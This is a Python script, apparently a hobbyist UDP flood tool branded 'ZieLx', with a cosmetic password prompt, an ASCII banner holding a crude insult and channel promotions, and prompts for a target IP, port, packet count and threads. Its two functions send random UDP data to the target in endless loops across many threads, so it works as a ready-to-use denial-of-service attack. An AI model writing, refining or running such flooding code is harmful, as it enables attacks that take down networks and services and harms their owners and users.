import random
import socket
import threading
import os,sys
import time

os.system("clear") 
password = input("[+] Password :")
time.sleep(2)
print("[•]  WAIT FOR 5 SECOND!!! ") 
time.sleep(5) 
if password=="zielxv4":
  print("[✓] Login Successful!!!")
  time.sleep(3)
  os.system("clear")
  print("=>Build By ZieLx<=")
  time.sleep(1)
  print("=>YT ZIEL ?<= ")
  time.sleep(1)
  print("=>DONT FORGET TO SUBS MY YOUTUBE CHANNEL<=")
  time.sleep(3)
os.system("clear")

print("\033[92m███████╗██╗███████╗██╗░░░░░██╗░░██╗ ") 
print("\033[92m╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝ ") 
print("\033[92m░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░ ") 
print("\033[92m██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░ ") 
print("\033[92m███████╗██║███████╗███████╗██╔╝╚██╗ ") 
print("\033[92m╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝ ") 
print("\033[92m         >>>  HAI KONTOL!!!  ") 
print("\033[92m        >>>  Build By ZieLx  ") 
print("\033[92m         >>>  My Community discord.gg/treax ") 
print("\033[92m         >>>  My Youtube : ZIEL ? ") 


ip = str(input("===> IP TARGET : "))
port = int(input("===> PORT TARGET : "))
times = int(input("===> PACKETS : "))
threads = int(input("===> THREADS : "))

def wibu():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f" \033[92m[•] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
		except:
			print(f" \033[92m[×] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")

def wibu2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f" \033[92m[•] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
		except:
			print(f" \033[92m[×] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")


# Threads
for y in range(threads):
	th = threading.Thread(target = wibu)
	th.start()
else:
		th = threading.Thread(target = wibu2)
		th.start()
		print("[!] Wrong Password!")
